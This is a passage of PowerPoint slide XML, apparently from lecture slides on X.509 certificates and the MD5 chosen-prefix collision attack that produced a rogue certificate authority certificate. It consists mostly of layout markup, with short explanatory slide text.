              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-131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53838093" name="object 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1371600" y="1592280"/>
            <a:ext cx="7543440" cy="4960440"/>
            <a:chOff x="1371600" y="1592280"/>
            <a:chExt cx="7543440" cy="4960440"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="563" name="object 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371600" y="1592280"/>
              <a:ext cx="4343040" cy="4960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64" name="object 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4352760" y="4952880"/>
              <a:ext cx="4562280" cy="533160"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 4562280"/>
                <a:gd name="textAreaRight" fmla="*/ 4562640 w 456228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4562475" h="533400" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="4562480" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="828680" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="828680" y="311150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="446082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="828680" y="444500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="828680" y="533400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4562480" y="533400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="456248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5" name="object 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4352760" y="4952880"/>
              <a:ext cx="4562280" cy="533160"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 4562280"/>
                <a:gd name="textAreaRight" fmla="*/ 4562640 w 4562280"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 533160"/>
                <a:gd name="textAreaBottom" fmla="*/ 533520 h 533160"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="4562475" h="533400" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="828679" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1450979" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2384429" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4562478" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4562478" y="311149"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4562478" y="444499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4562478" y="533399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2384429" y="533399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1450979" y="533399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="828679" y="533399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="828679" y="444499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="446081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="828679" y="311149"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="828679" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="126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04195042" name="object 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5331600" y="4950360"/>
            <a:ext cx="3438720" cy="647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3400" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="508680" indent="-496439">
              <a:lnSpc>
                <a:spcPts val="1638"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="184"/>
              </a:spcBef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Added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X.509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versions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2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3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1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address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usability</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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1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">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>security</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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400" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>problems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596306" name="object 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4038480" y="4724280"/>
            <a:ext cx="304560" cy="1371240"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 304560"/>
              <a:gd name="textAreaRight" fmla="*/ 304920 w 30456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w="304800" h="1371600" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="59320" y="7540"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107763" y="28102"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="140423" y="58600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152399" y="95948"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152399" y="583501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="164376" y="620849"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="197036" y="651347"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="245479" y="671909"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="304799" y="679449"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="245479" y="686989"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="197036" y="707552"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="164376" y="738050"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152399" y="775397"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152399" y="1275651"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="140423" y="1312998"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107763" y="1343496"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59320" y="1364059"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1371599"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="19049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841738" name="object 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2438280" y="6248520"/>
            <a:ext cx="1447560" cy="144719"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E4E4E4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7560" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="10800" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="0" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>hash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263234" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="6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A8FFE457-41E1-4FC6-B7B0-5391C57DD78A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782452" name="object 2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96075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290484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Back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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-3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2008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9398150" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="6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57C3AFD7-F60D-4296-93C2-66878B9C990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49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389933" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1058400"/>
            <a:ext cx="8254080" cy="4045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30320" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="4660920">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1026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14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Many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still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used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MD5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1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RapidSSL,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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FreeSSL,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TrustCenter,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Data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Security,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Thawte,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verisign.co.jp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59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Sotirov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collected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30,000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website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7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9,000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them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were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signed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MD5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hash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41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97%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those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were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issued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RapidSSL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632055" name="object 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1219320" y="17524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67682" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1666080" y="1831320"/>
            <a:ext cx="14022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number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397706" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1219320" y="22096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464535" name="object 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1640880" y="2288520"/>
            <a:ext cx="14302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validity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-114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period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482826" name="object 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1219320" y="2666880"/>
            <a:ext cx="2285640" cy="99036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990360"/>
              <a:gd name="textAreaBottom" fmla="*/ 990720 h 990360"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="2286000" h="9906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990599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="9905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638363" name="object 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1666080" y="2875320"/>
            <a:ext cx="1398600" cy="82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 indent="266760">
              <a:lnSpc>
                <a:spcPts val="2100"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="218"/>
              </a:spcBef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real</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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cert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domain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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name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656843" name="object 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1219320" y="3657600"/>
            <a:ext cx="2285640" cy="198072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980720"/>
              <a:gd name="textAreaBottom" fmla="*/ 1981080 h 1980720"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="2286000" h="1981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981199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1981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317405" name="object 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1932840" y="4286520"/>
            <a:ext cx="855000" cy="97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17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real</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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cert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18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key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501578" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1219320" y="56386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228525" name="object 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1488600" y="5717520"/>
            <a:ext cx="17388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X.509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extensions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156784" name="object 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1219320" y="60958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148386" name="object 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1882080" y="6174720"/>
            <a:ext cx="9590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signature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34636716" name="object 14"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3505320" y="3657600"/>
            <a:ext cx="2361960" cy="2895480"/>
            <a:chOff x="3505320" y="3657600"/>
            <a:chExt cx="2361960" cy="2895480"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="587" name="object 15"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3505320" y="365760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8"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="6349">
              <a:solidFill>
                <a:srgbClr val="FF7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8" name="object 16"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3505320" y="563868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7"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="6349">
              <a:solidFill>
                <a:srgbClr val="FF7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9" name="object 17"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3505320" y="655164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6"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="6349">
              <a:solidFill>
                <a:srgbClr val="008F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0009476" name="object 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3523680" y="5803560"/>
            <a:ext cx="233568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indent="406439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identical</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-75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1">
                <a:solidFill>
                  <a:srgbClr val="165E0C"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>bytes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(copied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from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real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21">
                <a:solidFill>
                  <a:srgbClr val="165E0C"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>cert)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095080" name="object 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4026960" y="4833720"/>
            <a:ext cx="1301400" cy="25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1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF8029"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>collision</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-60">
                <a:solidFill>
                  <a:srgbClr val="FF8029"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="FF8029"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>bits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7993062" name="object 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4065120" y="5123520"/>
            <a:ext cx="1227600" cy="25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1" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="FF8029"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>(computed)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958640" name="object 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4030200" y="2425320"/>
            <a:ext cx="140112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88920" indent="-76320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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>chosen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-60">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>prefix (difference)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56182992" name="object 22"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3505320" y="1752480"/>
            <a:ext cx="4647600" cy="456840"/>
            <a:chOff x="3505320" y="1752480"/>
            <a:chExt cx="4647600" cy="456840"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="595" name="object 23"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3505320" y="175248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5" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2362199" y="1587"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="6349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6" name="object 24"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5867280" y="1752480"/>
              <a:ext cx="2285640" cy="456840"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2285640"/>
                <a:gd name="textAreaRight" fmla="*/ 2286000 w 2285640"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 456840"/>
                <a:gd name="textAreaBottom" fmla="*/ 457200 h 456840"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="2286000" h="457200" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2285999" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2285999" y="457199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4571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4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40622693" name="object 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6314400" y="1831320"/>
            <a:ext cx="14022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number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334912" name="object 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5867280" y="22096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04962" name="object 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6289200" y="2288520"/>
            <a:ext cx="14302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validity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-114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period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962222" name="object 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5867280" y="2666880"/>
            <a:ext cx="2285640" cy="99036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990360"/>
              <a:gd name="textAreaBottom" fmla="*/ 990720 h 990360"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="2286000" h="9906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990599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="9905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656381" name="object 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6314400" y="2875320"/>
            <a:ext cx="1398600" cy="82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 indent="165240">
              <a:lnSpc>
                <a:spcPts val="2100"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="218"/>
              </a:spcBef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rgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>rogue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-55">
                <a:solidFill>
                  <a:srgbClr val="FF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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>cert </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>domain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="FF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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>name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37126" name="object 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5867280" y="3657600"/>
            <a:ext cx="2285640" cy="198072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980720"/>
              <a:gd name="textAreaBottom" fmla="*/ 1981080 h 1980720"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="2286000" h="1981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981199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1981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689809" name="object 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6835320" y="4498200"/>
            <a:ext cx="35028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???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476966" name="object 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5867280" y="56386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055693" name="object 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6136560" y="5717520"/>
            <a:ext cx="17388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X.509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extensions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55702" name="object 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5867280" y="609588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571121" name="object 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6530400" y="6174720"/>
            <a:ext cx="9590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signature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090239" name="object 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="372600" y="1891800"/>
            <a:ext cx="69480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indent="25560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660066"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>set</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="660066"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="660066"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="660066"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="660066"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="660066"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>CA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8444001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Colliding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-114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9635589" name="object 38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13701" name="object 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5184000" y="1176120"/>
            <a:ext cx="36057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52813193" name="object 40"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3441600" y="3809880"/>
            <a:ext cx="2577600" cy="904680"/>
            <a:chOff x="3441600" y="3809880"/>
            <a:chExt cx="2577600" cy="904680"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="613" name="object 41"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3441600" y="3809880"/>
              <a:ext cx="2577600" cy="904680"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2577600"/>
                <a:gd name="textAreaRight" fmla="*/ 2577960 w 2577600"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 904680"/>
                <a:gd name="textAreaBottom" fmla="*/ 905040 h 904680"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="2578100" h="904875" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="2578100" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="904874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2578100" y="904874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2578100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4" name="object 42"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3441600" y="3809880"/>
              <a:ext cx="2577600" cy="904680"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2577600"/>
                <a:gd name="textAreaRight" fmla="*/ 2577960 w 2577600"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 904680"/>
                <a:gd name="textAreaBottom" fmla="*/ 905040 h 904680"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="2578100" h="904875" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2578099" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2578099" y="904874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="90487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22163160" name="object 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3533040" y="3780000"/>
            <a:ext cx="2394720" cy="12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444600" indent="-431640">
              <a:lnSpc>
                <a:spcPct val="117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Hash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4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same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MD5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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value!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9215204" name="object 44"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="304920" y="3972240"/>
            <a:ext cx="6171480" cy="1590120"/>
            <a:chOff x="304920" y="3972240"/>
            <a:chExt cx="6171480" cy="1590120"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="617" name="object 45"/>
